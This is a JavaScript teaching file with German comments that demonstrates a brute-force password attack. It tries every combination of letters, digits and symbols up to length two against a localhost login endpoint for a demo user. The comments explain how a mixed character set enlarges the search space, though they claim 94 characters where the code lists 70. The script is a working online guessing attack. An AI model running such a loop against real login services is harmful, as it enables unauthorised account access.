// Poly-Alphabet-Angriff (Stufe 2.2, "mittel").
//
// "Mono" (2.1) = EIN Zeichensatz, z.B. nur a-z.
// "Poly" (hier) = MEHRERE Zeichensätze gemischt: Klein- UND Grossbuchstaben,
// Zahlen UND Sonderzeichen. Sonst funktioniert es genau wie 2_1_bruteforce.js:
// alle Kombinationen Zeichen für Zeichen durchprobieren.
//
// Wichtig fürs Verständnis: Je mehr verschiedene Zeichen erlaubt sind, desto mehr
// Kombinationen gibt es pro Stelle -> der Suchraum wächst extrem schnell.
// Bei 94 Zeichen sind es 94 Möglichkeiten für 1 Stelle, 94*94 für 2 Stellen usw.
// Deshalb ist Poly-Alphabet schwerer/langsamer als Mono-Alphabet.

// der volle ("Poly-") Zeichensatz: a-z, A-Z, 0-9 und ein paar Sonderzeichen
const charset =
  "abcdefghijklmnopqrstuvwxyz" +
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
  "0123456789" +
  "!@#$%^&*";

// klein gehalten, weil der Suchraum sonst explodiert (94^3 = über 800'000)
// -> mit maxLength 2 bleibt die Demo in Sekunden fertig
const maxLength = 2;

// kurzer Demo-Benutzer, dessen Passwort eine Ziffer enthält ("a7").
// Mit nur a-z (wie bei 2.1) wäre "a7" NICHT findbar -> zeigt, warum der
// gemischte Zeichensatz nötig ist.
const username = "test";

// einen Login-Versuch schicken, true wenn das Passwort stimmt
// async/await, weil die Antwort vom Server kommt und wir darauf warten müssen
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  return response.status === 200; // 200 = Login OK
}

// baut das Passwort Zeichen für Zeichen auf und ruft sich selbst auf (Rekursion),
// genau wie bei 2_1 - nur dass charset hier viel mehr Zeichen enthält
async function buildAndTry(prefix, length) {
  // Kandidat ist lang genug -> beim Server ausprobieren
  if (prefix.length === length) {
    const found = await tryLogin(username, prefix);
    if (found) {
      console.log("Passwort gefunden:", prefix);
      return true;
    }
    return false;
  }

  // noch zu kurz -> jedes Zeichen anhängen und tiefer weitermachen
  for (const char of charset) {
    const found = await buildAndTry(prefix + char, length);
    if (found) return true; // Treffer nach oben durchreichen -> aufhören
  }
  return false;
}

async function polyAlphabetAttack() {
  const start = Date.now();

  // zuerst Länge 1, dann 2, ... bis maxLength
  for (let length = 1; length <= maxLength; length++) {
    console.log("Probiere Länge", length, "...");
    const found = await buildAndTry("", length);
    if (found) break;
  }

  const seconds = (Date.now() - start) / 1000;
  console.log("Dauer:", seconds, "Sekunden");
}

polyAlphabetAttack(); // Angriff starten
